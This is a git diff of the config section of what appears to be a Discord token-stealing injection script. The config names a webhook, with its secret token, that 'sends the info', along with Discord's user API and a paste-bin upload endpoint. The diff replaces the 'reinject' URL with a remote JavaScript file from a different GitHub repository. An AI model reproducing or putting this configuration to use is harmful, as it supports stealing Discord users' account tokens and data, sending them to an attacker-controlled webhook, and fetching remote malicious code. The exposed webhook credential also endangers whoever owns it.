@@ -12,7 +12,7 @@ const config = {
     embed_icon: 'https://i.imgur.com/hkBwowN.gif'.replace(/ /g,'%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
     embed_color: 020000, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
     webhook: 'https://discordapp.com/api/webhooks/1013304965487394856/o3i0gHlgr9hJXzFfjMktKYR_x4ch5qOxPupE7x0PGTZf_ADyb5vh3lvBSAl6i_YaaSex', //your discord webhook there obviously
-    injection_url: 'https://raw.githubusercontent.com/Debestof/Discord-Injection/master/Injection-clean.js', //injection url for when it reinjects
+    injection_url: 'https://raw.githubusercontent.com/user0xqbug/dadaad/main/eqwwqeqweqweq.js', //injection url for when it reinjects
     /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
     api: 'https://discord.com/api/v9/users/@me',
     bin: 'https://dpaste.com/api/',
